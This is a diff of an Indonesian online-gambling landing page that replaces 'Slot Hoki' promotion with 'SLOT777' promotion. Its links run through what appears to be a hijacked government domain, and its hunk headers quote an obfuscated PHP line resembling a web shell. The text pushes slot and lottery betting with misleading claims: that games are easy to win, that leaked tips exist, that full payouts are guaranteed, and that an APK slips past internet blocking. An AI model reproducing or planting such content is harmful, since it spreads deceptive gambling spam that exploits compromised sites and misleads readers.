-                  <a href="https://micocar.com/slot-hoki/" title="slot hoki">
-                    <amp-img src="https://i.ibb.co/hYWG2Fk/slot-hoki.png" alt="slot hoki" width="150" height="34" />
+                <a itemprop="url" href="https://jdih.gunungsitolikota.go.id/slot-gacor/" title="SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin">
+                  <a href="https://jdih.gunungsitolikota.go.id/slot-gacor/" title="SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin">
+                    <amp-img src="https://i.postimg.cc/J0tmpS3G/slot-gacor.png" alt="SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin" width="150" height="34" />
                   </a>
-                  <meta itemprop="name" content="slot hoki">
+                  <meta itemprop="name" content="SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin">
                 </a>
               </span>
             </div>
@@ -2712,6 +1917,7 @@ $scandir = $func[21]($dir);
         </div>
       </div>
     </div>
+    
     <div class="clear"></div>
     <div class="content">
       <div class="container">
@@ -2719,11 +1925,11 @@ $scandir = $func[21]($dir);
           <div class="col-md-4">
             <div class="logo acenter">
               <span itemscope="itemscope" itemtype="http://schema.org/Brand">
-                <a itemprop="url" href="https://micocar.com/slot-hoki/" title="slot hoki">
-                  <a href="https://micocar.com/slot-hoki/" title="slot hoki">
-                    <amp-img src="https://i.ibb.co/hYWG2Fk/slot-hoki.png" alt="slot hoki" width="300" height="68" layout="responsive" />
+                <a itemprop="url" href="https://jdih.gunungsitolikota.go.id/slot-gacor/" title="SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin">
+                  <a href="https://jdih.gunungsitolikota.go.id/slot-gacor/" title="SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin">
+                    <amp-img src="https://i.postimg.cc/J0tmpS3G/slot-gacor.png" alt="SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin" width="300" height="68" layout="responsive" />
                   </a>
-                  <meta itemprop="name" content="slot hoki">
+                  <meta itemprop="name" content="SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin">
                 </a>
               </span>
             </div>
@@ -2731,251 +1937,311 @@ $scandir = $func[21]($dir);
           <div class="col-md-8">
             <div class="row logform">
               <div class="col-xs-6">
-                <a href="https://rebrand.ly/istanacuan" target="_blank" rel="nofollow noreferrer">
+                <a href="https://ojs99bet1.cc/ID00001/register" target="_blank" rel="nofollow noreferrer">
                   <span class="tron-login">LOGIN</span>
                 </a>
               </div>
               <div class="col-xs-6">
-                <a href="https://rebrand.ly/istanacuan" target="_blank" rel="nofollow noreferrer">
+                <a href="https://ojs99bet1.cc/ID00001/register" target="_blank" rel="nofollow noreferrer">
                   <span class="tron-regis">DAFTAR</span>
                 </a>
               </div>
             </div>
           </div>
         </div>
-        <div class="row">
-          <div class="col-md-12 mt-3">
-            <a href="https://rebrand.ly/istanacuan" rel="nofollow noreferrer" target="_blank">
-              <button type="login" class="btn btn-daf">SLOT HOKI</a>
-          </div>
+        <div class="spacer"></div>
+      <div class="container">
+        <div class="item-8 item-xs-12 m-b-1 slider-area owl-carousel">
+          <amp-carousel width="994" height="406" layout="responsive" type="slides" autoplay delay="4000">
+            <amp-img src="https://i.postimg.cc/RCJyPq5G/image.png" width="994" height="406" layout="responsive" alt="SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin">
+              <amp-img alt="SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin" fallback width="994" height="406" layout="responsive" src="https://i.postimg.cc/RCJyPq5G/image.png"></amp-img>
+            </amp-img>
+          </amp-carousel>
         </div>
       </div>
-    </div>
-    <div class="container">
-      <div class="item-8 item-xs-12 m-b-1 slider-area owl-carousel">
-        <amp-carousel width="2" height="1" layout="responsive" type="slides" autoplay delay="4000">
-          <amp-img src="https://i.ibb.co/BBDXvyJ/slot-hoki.jpg" width="5" height="0.7" layout="responsive" alt="slot hoki">
-            <amp-img alt="slot hoki" fallback width="2" height="0.7" layout="responsive" src="https://i.ibb.co/BBDXvyJ/slot-hoki.jpg"></amp-img>
-          </amp-img>
-        </amp-carousel>
-      </div>
-    </div>
-    <div class="clear"></div>
-    </div>
-    <div class="bottom bg-dark">
+      <div class="clear"></div>
       <div class="container">
-        <div class="row p-0" style="background-color: #000;">
-          <div class="col-md-6 pt-3 p-0 acenter">
-            <div class="row">
-              <div class="col-xs-6">
-                <a href="https://micocar.com/slot-hoki/" title="slot hoki">
-                  <span class="tron">SLOT ONLINE</span>
-                </a>
+        <div class="slide mt-2 mtop mb3 paddy">
+          <amp-img src="https://i.postimg.cc/g06cM90C/GIF-Jackpot-Aq2n-Xng-Z2eur6q-Xz.gif" alt="SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin" width="792" height="164" layout="responsive" />
+        </div>
+      </div>
+      <div class="bottom bg-dark">
+        <div class="container">
+          <div class="row p-0" style="background-color: #000;">
+            <div class="col-md-6 pt-3 p-0 acenter">
+              <div class="row">
+                <div class="col-xs-6">
+                  <a href="https://ojs99bet1.cc/ID00001/register" title="Slot Gacor">
+                    <span class="tron">Slot Resmi</span>
+                  </a>
+                </div>
+                <div class="col-xs-6">
+                  <a href="https://ojs99bet1.cc/ID00001/register" title="PROMO Slot">
+                    <span class="tron">Slot Gacor</span>
+                  </a>
+                </div>
               </div>
-              <div class="col-xs-6">
-                <a href="https://micocar.com/slot-hoki/" title="situs togel online">
-                  <span class="tron">TOGEL ONLINE</span>
-                </a>
+            </div>
+            <div class="col-md-6 pt-3 p-0 acenter">
+              <div class="row">
+                <div class="col-xs-6">
+                  <a href="https://ojs99bet1.cc/ID00001/register" title="RTP">
+                    <span class="tron">Situs Slot Gacor</span>
+                  </a>
+                </div>
+                <div class="col-xs-6">
+                  <a href="https://ojs99bet1.cc/ID00001/register" rel="nofollow noopener" target="_blank" title="TOGEL" class="spacer">
+                    <span class="tron">SLOT777</span>
+                  </a>
+                </div>
               </div>
             </div>
           </div>
-          <div class="col-md-6 pt-3 p-0 acenter">
-            <div class="row">
-              <div class="col-xs-6">
-                <a href="https://micocar.com/slot-hoki/" title="judi bola">
-                  <span class="tron">JUDI BOLA</span>
-                </a>
-              </div>
-              <div class="col-xs-6">
-                <a href="https://micocar.com/slot-hoki/" rel="nofollow noopener" target="_blank" title="slot hoki" class="spacer">
-                  <span class="tron">CASINO ONLINE</span>
-                </a>
-              </div>
-            </div>
-          </div>
         </div>
       </div>
-    </div>
-    <div class="spacer"></div>
-    <div class="container">
-      <div class="table">
-        <table class="alojudi" style="width:100%">
-          <thead>
-            <tr>
-              <th colspan="3">TENTANG SLOT HOKI</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td style="padding: 10px;">Nama Situs</td>
-              <td style="padding: 10px;">SLOT HOKI</td>
-            </tr>
-            <tr>
-              <td style="padding: 10px;">Jenis Permainan</td>
-              <td style="padding: 10px;">JUDI SLOT ONLINE</td>
-            </tr>
-            <tr>
-              <td style="padding: 10px;">Minimal Deposit</td>
-              <td style="padding: 10px;">Rp. 10.000</td>
-            </tr>
-            <tr>
-              <td style="padding: 10px;">Metode Deposit</td>
-              <td style="padding: 10px;">Transfer Bank, E-Wallet, Pulsa</td>
-            </tr>
-            <tr>
-              <td style="padding: 10px;">Mata Uang</td>
-              <td style="padding: 10px;">IDR (Indonesian Rupiah)</td>
-            </tr>
-            <tr>
-              <td style="padding: 10px;">Jam Operasional</td>
-              <td style="padding: 10px;">24 Jam Online</td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
-    </div>
-    <br>
-    <div class="bottom bg-dark">
+    
       <div class="container">
-        <div class="row mb-3" style="background-color: #020202;">
-          <div class="col-md-12 pb-5">
-            <div class="site-description">
-              <p id="breadcrumbs">
-                <span>
-                  <span>
-                    <a href="https://micocar.com/slot-hoki/">Home</a> » <a href="https://micocar.com/slot-hoki/">SLOT HOKI</a> » <strong class="breadcrumb_last" aria-current="page">Slot Hoki: Situs Judi Slot Online Paling Gacor Terbaik Hari Ini</strong>
+        <div class="table">
+          <table class="SLOT777" style="width:100%">
+            <thead>
+              <tr>
+                <th colspan="3">INFORMASI LENGKAP TENTANG SITUS SLOT777</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td style="padding: 10px;">Nama Situs</td>
+                <td style="padding: 10px;">
+                  <a href="https://jdih.gunungsitolikota.go.id/slot-gacor/" title="SLOT777" rel="nofollow noopener" target="_blank">SLOT777</a>
+                </td>
+              </tr>
+              <tr>
+                <td style="padding: 10px;">Jenis Permainan</td>
+                <td style="padding: 10px;">
+                  <a href="https://jdih.gunungsitolikota.go.id/slot-gacor/" title="Slot Online">Judi Slot Online</a>
+                </td>
+              </tr>
+              <tr>
+                <td style="padding: 10px;">Minimal Deposit</td>
+                <td style="padding: 10px;">Rp. 50.000</td>
+              </tr>
+              <tr>
+                <td style="padding: 10px;">Metode Deposit</td>
+                <td style="padding: 10px;">Transfer Bank dan E-Wallet</td>
+              </tr>
+              <tr>
+                <td style="padding: 10px;">Mata Uang</td>
+                <td style="padding: 10px;">IDR (Indonesian Rupiah)</td>
+              </tr>
+              <tr>
+                <td style="padding: 10px;">Jam Operasional</td>
+                <td style="padding: 10px;">Situs Slot Gacor</td>
+              </tr>
+              <tr>
+                <td style="padding: 10px;">Daftar Sekarang</td>
+                <td style="padding: 10px;">
+                  <span style="color: #e30707;">
+                    <a style="color: #e30707;" title="SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin" href="https://ojs99bet1.cc/ID00001/register" target="_blank" rel="nofollow noopener">KLIK DISINI</a>
                   </span>
-                </span>
-              </p>
-              <hr />
-              <div class="tron-images"></div>
-              <h1 style="color: #ffffff;">
-                <strong>Slot Hoki: Situs Judi Slot Online Paling Gacor Terbaik Hari Ini</strong>
-              </h1>
-              <p>Selamat datang di <a href="https://micocar.com/slot-hoki/"></a>Slot Hoki</a>: Situs Slot Terpercaya di Indoneisa yang menyediakan berbagai permainan slot online terbaik hari ini. Situs Online Slot hoki ini memberikan pelayanan VIP yang disediakan untuk pemain yang aktif. Permainan slot online yang ada di dalam situs ini memberikan kemudahan kemenangan jackpot terbesar dengan menggunakan modal keciil uang asli. Situs ini juga memberikan banyak kategori permainan judi online, sebut saja Slot Online, Casino Online, Sportsbook, Sabung Ayam, Tembak Ikan, Poker, dan Arcade. Permainan slot online disini memiliki RTP Tertinggi dari provider resmi ternama dunia, seperti: Pragmatic Play, Habanero, Slot88, PG Soft, Joker Gaming, dan lainnya.</p>
-            <p><a href="https://micocar.com/slot-hoki/">Situs Slot Gacor</a> sangat diminati oleh pemain slot dari berbagai penjuru dunia. Kemudahan yang diberikan oleh Slot Online yaitu pemain bisa bermain kapan saja dengan menggunakan device yang dimilikinya seperti: Android, iPhone, Tablet, dan juga PC. Kita hanya cukup mendaftar di link yang disediakan dan melakukan deposit di situs slot hoki terbaik. Dalam waktu hanya sekian detik, kita sudah bisa memainkan permainan <a href="https://micocar.com/slot-hoki/">judi online</a> dengan menggunakan uang asli. Di Situs slot ini kita juga bisa melakukan demo free play, ini fitur yang sangat berguna bagi pemain yang ingin mempelajari terlebih dahulu permainan slot online yang tersedia.</p>
-            <h2>Cara Mendaftar Situs Slot Online Paling Gacor Hari Ini</h2>
-            <p>Jika anda adalah pemain slot pemula dan belum memahami cara mendaftar di situs slot hoki, anda sebaiknya mempelajari terlebih dahulu. Setiap <a href="https://micocar.com/slot-hoki/">situs slot judi</a> online memiliki cara pendaftaran yang berbeda. Tombol Pendaftaran disediakan situs judi online di bagian atas, anda cukup men-klik dan mengisi formulir pendaftaran yang tersedia.</p>
-            <p><strong>Daftar dengan menggunakan Akun Valid</strong></p>
-            <p>Saat mengisi formulir pendaftaran disarankan untuk mengisi data anda dengan benar dan valid, karena pendaftaran di satu situs <a href="https://micocar.com/slot-hoki/">slot online</a> memerlukan nomor handphone dan nomor akun rekening yang akan tersimpan dan tidak dapat digunakan lagi jika anda ingin membuat akun baru lainnya. Anda harus memiliki nomor yang berbeda jika ingin mendaftar dengan menggunakan akun yang berbeda.</p>
-            <p>Nomor rekening bank yang telah anda daftarkan akan digunakan untuk keperluan penarikan dana/withdraw. Jika anda salah 1 huruf atau berbeda dengan nama akun terdaftar, anda akan di tolak oleh cs/admin jika ingin melakukan penarikan dana. Makanya diwajibkan untuk mengisi formulir pendaftaran dengan menggunakan data yang benar dan valid.</p>
-            <p><strong>Menghubungi CS jika mengalami masalah saat mendaftar</strong></p>
-            <p><a href="https://micocar.com/slot-hoki/">Situs Judi</a> Onlne Hari Ini memiliki pelayanan terbaik dan proses yang cepat untuk membantu kita jika mengalami kesulitan saat mendaftar ataupun saat bermain di permainan judi online. Kami sebagain situs slot online terbaik memiliki CS profesional yang sudah terlatih dan ramah. Anda bisa bertanya kepada CS lewat Live Chat di kolom kanan bawah atau via Whatsapp, LINE, ataupun Telegram. CS kami akan menjawab semua pertanyaan anda dengan sopan dan ramah 24 jam online.</p>
-            <p><strong>Simpan Username dan Password yang digunakan di browser</strong></p>
-            <p>Setelah mendaftar anda bisa langsung menikmati permainan slot online. Username dan password sebaiknya disimpan di browser atau di notepad. Saat anda ingin bermain di device lain anda masih bisa login dengan menggunakan akun yang telah anda daftarkan. Jika anda ingin melakukan reset password anda bisa langsung menanyakan kepada CS.</p>
-            <h2>Daftar Slot Hoki Terbaik Gampang Menang Jackpot Terbesar</h2>
-            <p><span style="font-weight: 400;">Pasti kamu bingung kan? Mana situs <a href="https://micocar.com/slot-hoki/">slot gacor terbaik</a> dan terpercaya no 1 di Indonesia sebagai permainan yang seru untuk dimainkan. Bagi kalian yang sedang mencari situs judi terlengkap untuk anda bermain ataupun sedang mencari jenis daftar judi slot terbaik, kebetulan kami sedang mengulas mana provider terbaik di Indonesia.</span></p>
-            <p><span style="font-weight: 400;">Berikut adalah Nama Nama Situs Judi Slot Terbaik Dan Terpercaya No 1 yang memiliki <a href="https://micocar.com/slot-hoki/">slot jackpot terbesar</a> &amp; pastinya gampang menang yang harus dimainkan bagi pemula:</span></p>
-            <ol>
-            <li><span style="font-weight: 400;">Slot Online PRAGMATIC PLAY INDONESIA</span></li>
-            <li><span style="font-weight: 400;">Slot Online MICROGAMING</span></li>
-            <li><span style="font-weight: 400;">Slot Online JOKER</span></li>
-            <li><span style="font-weight: 400;">Slot Online SPADE GAMING</span></li>
-            <li><span style="font-weight: 400;">Slot Online HABANERO</span></li>
-            <li><span style="font-weight: 400;">Slot Online PLAYSTAR</span></li>
-            <li><span style="font-weight: 400;">Slot Online REEL KINGDOM</span></li>
-            <li><span style="font-weight: 400;">Slot Online TOP TREND</span></li>
-            <li><span style="font-weight: 400;">Slot Online SLOT88</span></li>
-            <li><span style="font-weight: 400;">Slot Online FA CHAI</span></li>
-            <li><span style="font-weight: 400;">Slot Online BNG</span></li>
-            <li><span style="font-weight: 400;">Slot Online BBIN</span></li>
-            <li><span style="font-weight: 400;">Slot Online BBP</span></li>
-            <li><span style="font-weight: 400;">Slot Online MIMI GAMING</span></li>
-            <li><span style="font-weight: 400;">Slot Online CQ9&nbsp;</span></li>
-            <li><span style="font-weight: 400;">Slot Online PG SOFT</span></li>
-            </ol>
-            <h2><strong>DAFTAR GAME SLOT ONLINE PALING GACOR TERBAIK&nbsp;</strong></h2>
-            <p><span style="font-weight: 400;">Permainan <a href="https://micocar.com/slot-hoki/">slot gacor</a> terkenal dengan kesulitannya dalam memenangkan permainan. Dalam permainan slot online ini pemain tidak akan dapat melakukan kecurangan sama sekali. Karena slot bekerja dengan menggunakan mesin. Pemain tidak bisa menebak dengan asal-asalan, mereka harus menggunakan strategi permainan yang bagus agar bisa menangkan permainan dengan mudah.</span></p>
-            <p><span style="font-weight: 400;">Salah satu cara dan strategi permainan slot yang bagus adalah dengan bermain pada situs slot hoki. Setiap provider memiliki permainan slot hoki. Slot hoki merupakan jenis permainan yang sangat mudah sekali dikalahkan, bahkan oleh pemain pemula sekalipun. Namun provider tidak akan membuka data slot hoki mereka.</span></p>
-            <p><span style="font-weight: 400;">Anda akan menemukan bocoran slot hoki di situs ini. Di sini akan ada beberapa bocoran permainan slot hoki dan paling mudah dikalahkan. Sehingga pemain bisa menang dengan lebih mudah. Adapun beberapa jenis permainan slot hoki dari beberapa jenis provider slot ternama dunia, di antaranya yaitu:</span></p>
-            <ol>
-            <li>
-            <h3><strong> Slot Hoki Pragmatic Play</strong></h3>
-            </li>
-            </ol>
-            <p><span style="font-weight: 400;">Pragmatic play adalah slot populer di dunia. Jutaan orang sudah memilih dan menggunakan layanan permainan ini. Di dalam slot pragmatic terdapat beragam jenis permainan slot yang menarik, gacor dan sangat mudah sekali dikalahkan bahkan oleh pemain pemula sekalipun, seperti:</span></p>
-            <ul>
-            <li><span style="font-weight: 400;">Startlihgt princess</span></li>
-            <li><span style="font-weight: 400;">Sweet bonanza</span></li>
-            <li><span style="font-weight: 400;">Joker Jewels</span></li>
-            <li><span style="font-weight: 400;">Wild wild gold, dan</span></li>
-            <li><span style="font-weight: 400;">Pyramid bonanza</span></li>
-            </ul>
-            <ol start="2">
-            <li>
-            <h3><strong> Slot Hoki Habanero</strong></h3>
-            </li>
-            </ol>
-            <p><span style="font-weight: 400;">Habanero hadirkan beragam koleksi Slot Hoki yang juga bisa dipilih dan dimainkan dengan mudah oleh setiap pemainnya. Para pemain bisa menangkan beragam jenis permainan menarik yang bisa memberikan kemenangan yang maksimal. Adapun beragam jenis Slot Hoki dari habanero, di antaranya:</span></p>
-            <ul>
-            <li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Hot hot fruit</span></li>
-            <li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Koi gate</span></li>
-            <li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Wealth inn</span></li>
-            <li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Wild trcuk, dan</span></li>
-            <li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Candy tower</span></li>
-            </ul>
-            <ol start="3">
-            <li>
-            <h3><strong> Slot Hoki Spadegaming</strong></h3>
-            </li>
-            </ol>
-            <p><span style="font-weight: 400;">Spadegaming memiliki beragam jenis permainan gacor yang seru dan mudah dikalahkan. Baik mesin slot ataupun video slot juga memiliki beberapa jenis game yang mudah dikalahkan dengan mudah. Pemain pemula yang suka dengan slot spadegaming, sebaiknya pilih dan mainkan slot terbaik dari spadegaming, berikut:</span></p>
-            <ul>
-            <li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Magic kitty</span></li>
-            <li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Sugar bonanza</span></li>
-            <li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Kung fu dragon</span></li>
-            <li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Hugon quest, dan</span></li>
-            <li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Mayan gems</span></li>
-            </ul>
-            <h2><strong>4 CARA MUDAH MEMAHAMI SISTEM DAN TRANSAKSI SITUS SLOT DEPOSIT PULSA</strong></h2>
-            <p><span style="font-weight: 400;">Masih bingung saat ingin transaksi bisnis slot deposit pulsa? Sebetulnya tidak perlu cemas. Karena, dengan langkah-langkah yang demikian gampang, proses transaksi bisnis deposit pulsa di situs judi <a href="https://micocar.com/slot-hoki/">slot terpercaya</a> langsung akan dapat dilaksanakan. Langkahnya sangat gampang dan dapat dilaksanakan dengan cepat sekali.</span></p>
-            <p><span style="font-weight: 400;">Proses deposit memakai pulsa adalah metode baru di dunia situs judi online. Semua jenis keringanan dan keuntungan bisa didapatkan jika lakukan transaksi deposit lewat pulsa ini. Lantas, seperti apakah proses deposit lewat pulsa di situs slot online? Berikut adalah langkah <a href="https://micocar.com/slot-hoki/">slot deposit pulsa</a> mudah dan cepat.</span></p>
-            <p><strong>Persiapkan Pulsa</strong></p>
-            <p><span style="font-weight: 400;">Pertama - tama pemain harus menyiapkan pulsa terlebih dahulu. Karena yang dipindah atau dikirim adalah pulsa, karena itu pemain harus telah isi pulsa dahulu pada ponsel yang dipakai. Jumlah pulsa yang dikirim dapat disamakan dengan keperluan dari masing - masing pemain.</span></p>
-            <p><span style="font-weight: 400;">Jumlah pulsa yang hendak dikirim itu harus juga sesuai ketetapan yang ada. Karena, situs umumnya memutuskan batas minimum berkenaan deposit yang bisa dikirim oleh pemain. Maka, pastikan untuk menyiapkan pulsa yang telah sesuai batas deposit yang telah diputuskan oleh sebuah situs.</span></p>
-            <p><strong>Masuk ke Situs slot</strong></p>
-            <p><span style="font-weight: 400;">Jika penyiapan dana berbentuk pulsa sudah siap, pemain dapat masuk alias login ke situs gacor online. Masuk ke situs judi slot online dengan menggunakan username dan sandi yang awalnya sudah didaftarkan. Bila tidak berhasil masuk atau login, berarti ada yang keliru, lansung masuk ke kolom Live chat untuk bertanya ke CS.</span></p>
-            <p><span style="font-weight: 400;">Jika sudah masuk ke halaman khusus situs gacor online, pemain benar-benar dianjurkan untuk langsung ke arah halaman pembayaran deposit. Menu pembayaran deposit itu akan ada pada bagian depan situs.</span></p>
-            <p><strong>Melakukan deposit pulsa di situs judi online</strong></p>
-            <p><span style="font-weight: 400;">Proses deposit pulsaini dilaksanakan di halaman khusus. Mengatur semua pengangkutan dana deposit ke arah tempat yang telah disiapkan. Nanti CS akan memberi instruksi tentang apa yang perlu dilaksanakan untuk mengirim deposit lewat pulsa. Isi semua data dengan benar dan baik. Jangan lupa untuk mengikuti semua panduan dan instruksi yang telah diberi oleh CS saat melakukan deposit pulsa.</span></p>
-            <p><strong>Kirim Pulsa ke Situs Judi Slot Deposit Pulsa</strong></p>
-            <p><span style="font-weight: 400;">Proses paling akhir adalah mengirim pulsa ke <a href="https://micocar.com/slot-hoki/">akun judi slot</a> online yang telah ditentukan. Ikuti semua panduan dan instruksi yang telah diberikan. Lihat panduan dan instruksi yang diberikan oleh CS situs slot deposit pulsa. Baca dengan cermat dan teliti.</span></p>
-            <p><span style="font-weight: 400;">Jika proses deposit telah dilaksanakan, pemain tinggal menunggu saja. Umumnya, uang deposit akan masuk dalam waktu beberapa saat saja. Optimal adalah 5 menit. Jika lebih dari 30 menit belum masuk, kontak CS.dan verifikasi mengapa dana deposit lewat pulsa belum masuk.</span></p>
-            <h2>Link Situs Slot Hoki Terbaru 2022-2023 RTP Tertinggi</h2>
-            <p>Sebagian besar situs judi online menambahkan permainan baru setiap bulan - terutama slot online. Permainan Slot Hoki terbaru mempengaruhi persentase pengembalian keseluruhan ke pemain (RTP) di setiap situs game online. Kami memantau situasi ini untuk mengawasi <a href="https://micocar.com/slot-hoki/">slot online maxwin</a> terbaik setiap bulan.</p>
-            <p>Tujuan kami adalah mengarahkan Anda ke situs <a href="https://micocar.com/slot-hoki/">slot RTP</a> tertinggi. Dengan cara ini, Anda dapat secara konsisten memanfaatkan persentase slot jackpot terbesar dan memiliki peluang lebih kuat untuk memenangkan slot uang asli. Tentu saja, permainan individu memiliki dampak terbesar pada peluang Anda untuk menang. Namun, Anda akan meningkatkan peluang menemukan permainan slot online maxwin ini, dengan bermain di situs judi online dengan pengembalian slot RTP yang tinggi.</p>
-            <p><a href="https://micocar.com/slot-hoki/">Slot Gacor Hari Ini</a> memegang mahkotanya sebagai situs game dengan Jackpot Terbesar. Tetapi beberapa perubahan telah terjadi di enam besar, dengan slot tertentu naik atau turun peringkat. Anda dapat melihat pembayaran slot online terbaik untuk 2022-2023 di bawah ini, bersama dengan slot dan permainan meja dengan bayaran tertinggi.</p>
-            <ul>
-            <li>Situs Slot Online Pragmatic Play</li>
-            <li>Situs Slot Online Habanero</li>
-            <li>Situs Slot Online PG Soft</li>
-            <li>Situs Slot Online Slot88</li>
-            <li>Situs Slot Online Joker123</li>
-            <li>Situs Slot Online MicroGaming</li>
-            </ul>
-            <h2>Informasi Situs Slot Hoki Terpercaya RTP Hari Ini</h2>
-            <p>Meskipun halaman ini memberikan gambaran yang sangat baik tentang tingkat slot online maxwin dan slot gacor RTP, jika Anda mencari sesuatu yang sedikit lebih detil, Anda tidak bisa salah dengan ulasan slot online kami yang mendalam. Tim di sini memiliki pengalaman industri yang tak terhitung jumlahnya di antara mereka dan telah meninjau ratusan situs slot online, yang berarti kami tahu persis apa yang harus dicari ketika mengevaluasi situs Slot Hoki maxwin. Tentu saja, jika Anda hanya mencari tingkat kemenangan dan persentase RTP, Anda dapat membaca sekilas ke bagian berkaitan dari ulasan, tetapi jika Anda ingin menyelam sedikit lebih dalam, Anda akan menemukan segalanya mulai dari bonus yang ditawarkan hingga informasi tentang metode deposit slot.</p>
-            <p>Sebelum memainkan permainan yang tidak tercantum di sini di salah satu situs yang kami rekomendasikan, disarankan untuk terlebih dahulu memeriksa persentase slot online RTP sehingga Anda tahu apa yang secara teoritis bisa Anda menangkan dalam jangka panjang. Dalam kebanyakan kasus, cara termudah untuk melakukan ini adalah dengan mengklik tombol informasi atau live chat pada tampilan game dari judul yang Anda pilih. Ini biasanya akan membawa Anda ke layar baru dengan detil segala sesuatu mulai dari pembayaran dan paylines hingga persentase RTP Slot Hoki sehingga Anda dapat melihat apakah game tersebut tepat untuk Anda. Jika gagal, sebagian besar situs slot memiliki rincian lengkap dari permainan yang mereka tawarkan dan RTP mereka yang terletak jauh di bagian FAQ mereka.</p>
-            <p>Saat menulis ulasan dan halaman seperti ini, kami selalu memeriksa Syarat dan Ketentuan yang berlaku situs slot online dan permainan judi online untuk memastikan kami tidak salah mengartikan data penting seperti persentase kemenangan dan situs slot RTP. Meskipun informasi yang kami berikan telah diperiksa ulang untuk keakuratannya, tak perlu dikatakan bahwa kami selalu merekomendasikan pemain untuk mempelajari situs judi online dan halaman informasi permainan slot online itu sendiri, karena terkadang operator dapat mengubah mekanisme permainan mereka dalam waktu singkat.</p>
-            </div>
-            <div class="container">
-              <div class="copyleft acenter pb-2">
-                <span>&copy; 2022 • <a href="https://micocar.com/slot-hoki/">Slot Hoki</a>
-                </span>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    
+      <br>
+      <div class="bottom bg-dark">
+        <div class="container">
+          <div class="row mb-3" style="background-color: #020202;">
+            <div class="col-md-12 pb-5">
+              <div class="site-description">
+                <p id="breadcrumbs">
+                  <span>
+                    <span>
+                      <a href="https://jdih.gunungsitolikota.go.id/slot-gacor/">Home</a> » <a href="https://jdih.gunungsitolikota.go.id/slot-gacor/">SLOT777</a> » <strong class="breadcrumb_last" aria-current="page">SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin</strong>
+                    </span>
+                  </span>
+                </p>
+                <hr />
+                <h1 itemprop="headline">
+                    <strong>
+                      <span style="color: #e30707;">SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin</span>
+                    </strong>
+                  </h1>
+<p>SLOT777 ialah salah satu link situs judi <a href="https://jdih.gunungsitolikota.go.id/slot-gacor/"><strong>Situs Slot Gacor hari ini</strong></a> 2022 online terpercaya di Indonesia dengan bermacam- berbagai keunggulan yang dimiliki. Game Situs Slot Gacor hari ini 2022 hari ini jadi opsi utama para bettor mengingat game slot online ini bisa mendapatkan jackpot paling banyak dengan mudah. Terlebih dikala ini buat bermain slot tidak sesulit jaman dulu dimana jaman digital yang sudah maju kalian bisa bermain secara online di smartphone kalian. Kami sajikan Situs Slot Gacor hari ini 2022 maxwin Top gampang menang jackpot paling banyak dimana anjuran utamanya ialah SLOT777.</p>
+<h2><strong>Link Situs Slot Gacor Hari Ini 2022 Terpercaya Ditentukan Kualitas Terbaik</strong></h2>
+<p>Bersama link Situs <a href="https://jdih.gunungsitolikota.go.id/slot-gacor/"><strong>Slot Gacor hari ini</strong></a> 2022 terbaru di jamin berapapun kemenangan yang Kalian miliki hendak di bayarkan secara lunas tanpa ada potongan sedikit pula. Mengenai ini di karenakan kepuasan member ialah Mengenai yang sangat di utamakan, dan pelayanan yang di bagikan tampaknya hendak membuat pengalaman bermain Kalian disaat bermain slot jauh lebih baik. Segala penyedia Situs Slot Gacor hari ini 2022 yang ada di SLOT777 di jamin ialah yang terbaik dengan berbagai permainan terlengkap. Nyatanya dengan demikian Kalian tidak hendak merasa bosan kala bermain. Terlebih jumlah bonus yang di bagikan oleh SLOT777 masing- masing harinya sangatlah besar dan tidak memiliki batas. Bonus yang di bagikan nyatanya bisa Kalian gunakan sebagai bonus modal buat mendapatkan jackpot maxwin. Bersama SLOT777, Kalian hanya memerlukan satu akun maupun user id saja buat memainkan segala jenis permainan judi online yang terdapat. Dengan demikian, segala permainan hendak jadi lebih praktis dan mudah.</p>
+<h3><strong>Lakukan Login SLOT777 Mengenakan Smartphone Melalui APK Kalian memiliki 2 tata cara buat bisa bermain Link SLOT777</strong></h3>
+<p>di SLOT777. Tata cara yang dini ialah dengan langsung mengenakan link slot terbaru alternatif dari SLOT777, sehabis itu catatan akun slot Kalian dan login. Sehabis berhasil masuk, silahkan pilih berbagai jenis permainan judi yang Kalian ingin. Jangan kurang ingat melakukan pengisian saldo maupun deposit buat bisa memainkan segala jenis permainan yang terdapat. Tata cara lain buat bisa bermain di SLOT777 ialah dengan melakukan download APK SLOT777 yang sudah terdapat di kiri bawah layar Kalian. Kala Kalian mendownload APK SLOT777, sampai tidak perlu risau lagi terkena internet positif ataupun nawala. Dengan APK nyatanya Kalian bisa memainkan <a href="https://jdih.gunungsitolikota.go.id/slot-gacor/"><strong>Situs Slot Gacor</strong></a> hari ini 2022 di SLOT777 dengan lebih mudah dan praktis.</p>
+<h3><strong>Bonus Dan Promo SLOT777</strong></h3>
